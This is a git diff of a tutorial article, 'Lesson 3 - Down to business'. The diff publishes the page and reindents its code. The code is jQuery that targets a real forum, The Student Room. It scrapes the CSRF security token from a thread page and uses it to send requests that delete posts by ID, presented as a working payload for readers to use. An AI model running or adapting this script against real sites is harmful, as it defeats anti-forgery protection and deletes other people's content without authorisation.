@@ -1,8 +1,8 @@
 ---
 layout: article
 published: 
-  - false
-  - "false"
+  - true
+  - "true"
 title: "Lesson 3 - Down to business"
 abstract: "Enough messing, time to actually do something."
 author: Chrosson
@@ -44,8 +44,8 @@ Lets try the following (trying to delete the 100th post on TSR):
 
 ```
 jQuery.post(
-	'http://www.thestudentroom.co.uk/editpost.php',
-	'do=deletepost&s=&postid=100&deletepost=delete&reason=areallygoodreason',
+    'http://www.thestudentroom.co.uk/editpost.php',
+    'do=deletepost&s=&postid=100&deletepost=delete&reason=areallygoodreason',
     function (data) { console.log(data); alert(123); }
 );
 ```
@@ -60,7 +60,7 @@ To load a page and grab just the security token, we can do this:
 
 ```
 $('<div>').load(
-	'http://www.thestudentroom.co.uk/showthread.php?t=2387591 [name="securitytoken"]',
+    'http://www.thestudentroom.co.uk/showthread.php?t=2387591 [name="securitytoken"]',
     function () {alert(this.children[0].value);}
 )
 ```
@@ -72,12 +72,14 @@ But instead of alerting it, we could use it in our deletion request. So get the 
 ```
 var postid = 12345;
 jQuery('<div>')
-  .load('http://www.thestudentroom.co.uk/showthread.php?p=' + postid + ' [name="securitytoken"]', function () {
-    var securitytoken = this.children[0].value;
-    jQuery.post(
-      'http://www.thestudentroom.co.uk/editpost.php',
-      'do=deletepost&s=&postid=' + postid + '&deletepost=delete&reason=areallygoodreason&securitytoken=' + securitytoken,
-      function () { alert('deleted'); });
+    .load('http://www.thestudentroom.co.uk/showthread.php?p=' + postid + ' [name="securitytoken"]',
+    function () {
+        var securitytoken = this.children[0].value;
+        jQuery.post(
+            'http://www.thestudentroom.co.uk/editpost.php',
+            'do=deletepost&s=&postid=' + postid + '&deletepost=delete&reason=areallygoodreason&securitytoken=' + securitytoken,
+            function () { alert('deleted'); }
+        );
   });
 ```
 
